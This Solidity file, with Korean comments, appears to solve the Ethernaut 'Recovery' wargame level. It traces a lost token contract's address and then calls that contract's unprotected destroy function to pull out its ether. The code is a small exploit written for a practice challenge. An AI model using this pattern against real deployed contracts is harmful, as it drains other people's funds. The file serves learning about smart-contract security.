// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * Recovery 컨트랙트에서 생성한 SimpleToken 컨트랙트 주소 복원 후 0.001 ether 회수
 * 
 * 공격 방식
 * 1. Ethernaut 홈페이지에서 문제 인스턴스 생성
 * 2. cast run 0xTxHash --rpc-url <RPC_주소> 명령어 이용해서 생성한 인스턴스에 대한 트랜잭션 해시 내용 추적
 * 3. 2번에서 추적한 내용 중 토큰 생성 로그의 호출 주소를 이용하여 destroy 함수 실행
 */

interface SimpleToken {
    function transfer(address, uint256) external;
    function destroy(address) external;
}

contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        SimpleToken(target).destroy(address(this));
    }
}